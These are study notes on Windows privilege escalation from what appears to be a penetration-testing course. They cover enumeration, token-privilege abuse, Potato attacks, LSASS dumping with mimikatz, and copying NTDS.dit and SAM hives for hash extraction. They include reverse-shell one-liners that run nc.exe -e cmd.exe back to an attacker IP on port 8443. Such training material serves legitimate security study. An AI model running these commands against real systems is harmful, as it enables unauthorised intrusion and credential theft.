| Tool                                                                                                     | Description                                                                                                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                        | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                                                                                                                             |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)                                                                                                          |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)      | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                                                                                                                                         |
| [SharpUp](https://github.com/GhostPack/SharpUp)                                                          | C# version of PowerUp                                                                                                                                                                                                                                                                                                     |
| [JAWS](https://github.com/411Hall/JAWS)                                                                  | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                                                                                                                                  |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher)                                              | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                                                                                                         |
| [Watson](https://github.com/rasta-mouse/Watson)                                                          | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                                                                                                    |
| [LaZagne](https://github.com/AlessandroZ/LaZagne)                                                        | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more                                                                             |
| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)                        | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported                 |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)         | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |
## Situational Awareness
Important to get lay of the land before we can exploit the system. 

### Network Information
Could be possible to find a *dual homed* server. *Dual-homed* means a device belongs to multiple different networks, this could have several virtual or physical network interfaces.
We should always check *routing tables*. 
We can gather information about local domain (ip of domain controllers). We can view the *arp* cache to see other domains that a computer has interacted with. 
Can help with lateral movement.

#### Interfaces, IP Addresses, DNS Information
```
ipconfig /all
```
#### ARP
```
arp -a
```
#### Routing Table
```
route print
```

### Enumerating Protections
Check for *Antivirus* and *End-Point Detection and Response* (`EDR`).
Will help us craft custom payloads or modify tools before compiling them.

Many organizations use a *whitelist* to control which types of applications certain users can run. This could be used to block non-admin users from running `cmd` and `powershell`.

Popular solution is [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) and we can use `GetAppLockerPolicy` cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. 

Early enumeration helps us combat *AV* and *EDR*.

#### Check Windows Defender Status
```
Get-MpComputerStatus
```

#### List AppLocker Rules
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Test Applocker Policy
```powershell-session
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### Initial Enumeration
During our testing we may gain access to a low-privileged shell on a windows domain and need to perform testing to further our access.
We can view sensitive files, capture traffic and view credentials which may help us further our access.

We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter:

|   |
|---|
|The highly privileged `NT AUTHORITY\SYSTEM` account, or [LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.|
|The built-in local `administrator` account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.|
|Another local account that is a member of the local `Administrators` group. Any account in this group will have the same privileges as the built-in `administrator` account.|
|A standard (non-privileged) domain user who is part of the local `Administrators` group.|
|A domain admin (highly privileged in the Active Directory environment) that is part of the local `Administrators` group.|
### Key Data Points
*OS name*: Knowing the OS and version will give us an idea of the types of tools that may be available. 
*Version*: May be publicly available exploits for the OS version.
*Running Services*: Knowing what services are running on the host is important, especially those running as `NT AUTHORITY\SYSTEM` or an administrator-level account. A misconfigured or vulnerable service running in the context of a privileged account can be an easy win for privilege escalation.

### System Information
Using [tasklist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) command will give us a better idea of running applications.
```
tasklist /svc
```
It is essential to become familiar with standard Windows processes such as [Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem), [Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem), [WinLogon (winlogon.exe)](https://en.wikipedia.org/wiki/Winlogon), [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service), and [Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe)

### Display All Environment Variables
`PATH` variables infrequently changed but in the case of python/java may be changed to run commands.
We can view this using `set` its not infrequent to find.

### View Detailed Configuration Information
the `systeminfo` command will show if the box has been patched recently or is a vm.
possible to hide configuration settings from non-admin accounts.

### Patches and Updates
If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) using the *WMI-Command* binary with [QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering)
```
wmic qfe
```
we can also do this with PowerShell using the `Get-Hotfix` cmdlet
```powershell-session
Get-HotFix | ft -AutoSize
```

### Installed Programs
WMI can also be used to display installed software. With this we can find hard exploits
Is `FileZilla`/`Putty`/etc installed? Run `LaZagne`
```cmd-session
wmic product get name
```

```powershell-session
Get-WmiObject -Class Win32_Product |  select Name, Version
```

### Display Running Processes
`netstat` will display active `TCP/UDP` connections. Could possibly find a vulnerable service.
```cmd-session
netstat -ano
```

### User and Group Information
Users are often the weakest link in an organization, especially when systems are configured and patched well. Can possibly find password files.

#### Logged-In Users
Always important to determine which users are logged in. 
Are they Idle or Active? Can we determine what they're working on?
During evasive engagements, we may need to tread lightly on a host with other users to avoid  messing with what they're working on.
```cmd-session
query user
```

#### Current User
When we gain access to a host, we should always check what context our user is running under. Sometimes we already have access to `SYSTEM` or equivalent. Some service accounts may have *SeImpersonatePrivilege*, which can be easily abused to escalate privs with [Juicy Potato](https://github.com/ohpe/juicy-potato)
```
echo %USERNAME%
```
##### Current User Privileges
```cmd-session
whoami /priv
```
##### Current Users Group Information
```cmd-session
whoami /groups
```

#### Get All Users
Knowing other users on the system is also important. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth checking for credential re-use.
```cmd-session
net user
```
#### Get All Groups
Knowing what non-standard groups are present can help us find escalation vectors.
```cmd-session
net localgroup
```
#### Details About a Group
During our enumeration, we may discover credentials of another non-admin user who is a member of a local group that can be leveraged to escalate privileges.
```cmd-session
net localgroup administrators
```
#### Get Password Policy & Other Account Information
```cmd-session
net accounts
```

## Communication with Process
One of the best places to look for privilege escalation is the processes that are running on the system.
We could  place a web shell on the web server and gain a shell as the user running the web server.
Generally, this is not an administrator but will often have the `SeImpersonate` token, allowing for `Rogue/Juicy/Lonely Potato` to provide SYSTEM permissions.

### Access Tokens
Access tokens are used to describe security context of a process or thread. 
The token includes information about the user account's identity and privileges related to a specific process or thread.
When a user authenticates its password is checked against a security database, and if properly authenticated they will be assigned an access token.
Every time the user interacts with this process the token is presented again.

### Enumerating Network Services
The most common way people interact with processes is through a network socket (DNS, HTTP, SMB, etc.). The [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections
```
netstat -ano
```

The main thing to look for are entries listening on a loop back address *127.0.0.1* and *::1* that are not listening on the IP Address (`10.129.43.8`) or broadcast (`0.0.0.0`, `::/0`)
Network sockets for localhost are often overlooked and insecure as they're 'not accessible to the network'.

port `tcp 14147` used for filezillas admin panel.

### Named Pipes
Another way processes can communicate is named pipes.
Pipes are files stored in memory that get cleared after being read. Cobalt Strike uses pipes for every command (excluding [BOF](https://www.cobaltstrike.com/help-beacon-object-files)).

1. Beacon starts a named pipe of \.\pipe\msagent_12
2. Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12
3. Server displays what was written into \.\pipe\msagent_12

There are two types of pipes, [named pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) and anonymous pipes
Windows systems use client-server implementation for pipe communication. n this type of implementation, the process that creates a named pipe is the server, and the process communicating with the named pipe is the client. Named pipes can communicate using `half-duplex`, or a one-way channel with the client only being able to write data to the server, or `duplex`, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe. Every active connection to a named pipe server results in the creation of a new named pipe. These all share the same pipe name but communicate using a different data buffer.

We can use the tool `PipeList` from the *SysInternals Suite* to enumerate instances of named pipes.

### Listing Named Pipes with Pipelist
```cmd-session
pipelist.exe /accepteula
```

### Listing Pipes with Powershell
```powershell-session
gci \\.\pipe\
```

After obtaining a list of pipes we can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to enumerate permissions assigned to a specific named pipe by reviewing the *Discretionary Access List* (DACL) which shows us who has the permissions to modify, write, read, or execute a resourceWe can also review the DACLs of all named pipes using the command `.\accesschk.exe /accepteula \pipe\`.

### Reviewing LSASS Named Pipe Permissions
```cmd-session
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### Named Pipe Attack Example
This [WindscribeService Named Pipe Privilege Escalation](https://www.exploit-db.com/exploits/48021) is a great example. Using `accesschk` we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \pipe\* -v` and notice that the `WindscribeService` named pipe allows `READ` and `WRITE` access to the `Everyone` group, meaning all authenticated users.

#### Checking WindscribeService Named Pipe Permissions
Confirming with `accesschk` we see that the Everyone group does indeed have `FILE_ALL_ACCESS` (All possible access rights) over the pipe.
```cmd-session
 accesschk.exe -accepteula -w \pipe\WindscribeService -v
```
From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.


## Windows Privileges Overview
Rights an account is granted to do certain things on the machine.
Grand or Deny access to securable objects dependant on AD environment
Most privs disabled by default and are able to be enabled with an administrative cmd session.

### Windows Auth Process
Security principles are anything that can be authenticated by the windows OS including user and computer accounts, processes that run in the security context, and security groups.
Security principles are indentified with a [Security Identifier (SID)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows) when a *SID* is created it remains assigned to that principle for its lifetime.

##### Process
1. User attempts to access a securable object 
2. Users *SID* is compared to  [Access Control Entries (ACEs)](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries) within objects security descriptor (contains security info and access rights.)
3. Decision to Grant or Deny access is made.

![[Windows_Auth_Process.png]]
### Rights and Privs in Windows
Contains many groups which grants rights and privs. 

|**Group**|**Description**|
|---|---|
|Default Administrators|Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|Members can modify services, access SMB shares, and backup files.|
|Backup Operators|Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol.|
|Remote Management Users|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/).|

### User Rights Assignment
 User rights govern the methods by which a user can log on to a system.

|Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)|Setting Name|Standard Assignment|Description|
|---|---|---|---|
|SeNetworkLogonRight|[Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)|Administrators, Authenticated Users|Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.|
|SeRemoteInteractiveLogonRight|[Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)|Administrators, Remote Desktop Users|This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.|
|SeBackupPrivilege|[Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)|Administrators|This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.|
|SeSecurityPrivilege|[Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)|Administrators|This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.|
|SeTakeOwnershipPrivilege|[Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)|Administrators|This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.|
|SeDebugPrivilege|[Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)|Administrators|This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.|
|SeImpersonatePrivilege|[Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)|Administrators, Local Service, Network Service, Service|This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.|
|SeLoadDriverPrivilege|[Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)|Administrators|This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.|
|SeRestorePrivilege|[Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)|Administrators|This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.|
```
whoami /priv
```
will list user privs. Generally needs to be from an elevated shell.

If it is listed as *Disabled* this isnt the default setting and has been changed to be blocked.

We can view privileges assigned to a binary in the *security* tab of properties.
#### Commonly Abused Privs
1. *SeBackupPrivilege*: Grants read access to any file regardless of *ACL* 
	- Useful for collecting and exfil
2. *SeCreateTokenPrivilege*: Required to create primary token
	- Useful for Priv Esc
3. *SeDebugPrivilege*: Required to debug and adjust memory privilege 
	- Cred Access, Priv Esc, Defense Evasion
4. *SeLoadDriverPrivilege*: Required to load/unload driver
	 - Possible to load/unload malicious drivers
5. *SeRestorePrivilege*: Grand write access control to all files
	- Persistence and Defense Evasion 
6. *SeTakeOwnerPrivilege*: Take ownership of objects without being granted access
	- Persistence, Defense Evasion, Collection
7. *SeTcbPrivilige*: Trusted Computer Base. Trusted protections to subsystems
	- Priv Esc

### SeImpersonate and SeAssignPrimaryToken
Every process has a token that has information about the account thats running it. Not considered secure resources so exist in memory or can be bruteforced. 

To utilize the token we need *SeImpersonate* privileges. Generally only given to admin accounts and removed during hardening. 

Legit programs may use utilise another processes' token to escalate from Administrator to Local System, which has additional privs. They do this by making a call to the windows logon process to obtain a `SYSTEM` token then execute themselves with that token placing it within the system space. 

Attackers often abuse this privilege in the "Potato style" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

We can use this after gaining *RCE* via an application that runs in the context of a service account.

### SeImpersonate Example - Juicy Potato
In this context a SQL server is account is running in the context of the default *mssqlserver* account. 
We can connect to the MSSQL client with impacket tools and enable `xp_cmdshell` with `enable_xp_cmdshell` 
`xp_cmdshell` will then act as a shell.

We will then check `whoami /priv` to see that we have *SeImpersonate*. We will then use  [JuicyPotato](https://github.com/ohpe/juicy-potato) to escalate privs. 

We need to upload juicypotato and nc 
`./nc.exe`
	`-l COM listening port`
	`-p program`
	`-a argument passed to program`
	`-t createprocess call`

Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

#### Catching SYSTEM shell
```shell-session
sudo nc -lnvp 8443
```

### PrintSpoofer and RoguePotato
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.
```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.17 8443 -e cmd.exe" -t *
```

## SeDebugPrivilege
To run a particular service or assist in troubleshooting a user may be assigned *SeDebugPrivilege* instead of being added to the administrators group. Can be assigned  in domain policy under `Computer Settings > Windows Settings > Security Settings`.
Can be used to capture sensitive information in memory and modify kernel and application structures

If we find an account we can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good choice is Local Security Authority Subsystem Service (*LSASS*) which stores user credentials.

```cmd-session
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

If successful we can use mimikatz `sekurlsa::minidump` command. we can the use `sekurlsa::logonPasswords` to gain the hash. We can then use this as a pass the hash. 

*Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.*

If  we cannot load tools but have RDP access. We can take a manual dump in task manager. 

### RCE as SYSTEM
We can also leverage *SeDebugPrivilege* for *RCE*. We can launch a child process and using the elevated rights granted to our account to alter normal system behavior to inherit the token of a parent process and impersonate it. 

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

We can use tasklist to get a list of running proccesses and their PID
```powershell-session
tasklist
```
Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`.
Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user.

## SeTakeOwnershipPrivilege
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.
This privilege is assigned to admins by default and would be rare to find on a service account. 

The setting can be set in Group Policy under:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).

we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.

### Leveraging the Privilege 
#### Enabling SeTakeOwnershipPrivilege
Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell-session
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```
#### Choosing a Target File
Checking target file 
```powershell-session
C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
#### Checking File Ownership
We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.
```powershell-session
cmd /c dir /q 'C:\Department Shares\Private\IT'
```
We can see that the IT share appears to be owned by a service account and does contain a file `cred.txt` with some data inside it.

We can now use the `takeown` windows binary to take ownership of the file 
```powershell-session
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

#### Modifying the File ACL
We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```powershell-session
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

## Windows Built-in Groups
Windows servers and DCs have built in groups that ship with the os or get built in.

### Backup Operators
`Backup Operators` group. Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents.
Cant copy data using standard copy command, we need to pragmatically copy it specifying the `FILE_FLAG_BACKUP_SEMANTICS`
We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

#### Importing Libraries
```powershell-session
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Verifying SeBackupPrivilege is enabled 
```
Get-SeBackupPrivilege
```
#### Enabling SeBackupPrivilege
```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```
#### Copying a Protected File
```powershell-session
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

### Attacking a Domain Controller - Copying NTDS.dit
The active directory database *NTDS.dit* is a good target as it contains all NLTM hashes for users and objects.
As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```powershell-session
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

#### Copying NTDS.dit locally
we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```powershell-session
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

#### Backing up SAM and SYSTEM reg hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
```cmd-session
reg save HKLM\SYSTEM SYSTEM.SAV
```
```cmd-session
reg save HKLM\SAM SAM.SAV
```

#### Extracting creds from NTDS.dit
With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials using *DSInternals*.
```powershell-session
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

#### Extracting Hashes with Secretsdump
We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access.
If we crack the passwords we can provide insight into password policy and suggest remediations
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Robocopy
The built in utility `robocopy` can  be used to copy files in backup mode.
```cmd-session
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

## Event Log Readers
Organizations may enable logging of process command lines to help defenders monitor and identify possibly malicious behavior and identify binaries that should not be present on a system.
This can be loaded into a *SIEM* tool or into a search tool for defenders. The tools would then flag any potentially malicious activity, such as the `whoami`, `netstat`, and `tasklist` commands being run from a marketing executive's workstation.
This [study](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html) shows some of the most run commands by attackers after initial access (`tasklist`, `ver`, `ipconfig`, `systeminfo`, etc.), for reconnaissance (`dir`, `net view`, `ping`, `net use`, `type`, etc.), and for spreading malware within a network (`at`, `reg`, `wmic`, `wusa`, etc.)

```cmd-session
 net localgroup "Event Log Readers"
```
We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.

```powershell-session
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

#### Passing Credentials to wevtutil
```cmd-session
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
#### Searching Security Logs Using Get-WinEvent
```powershell-session
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
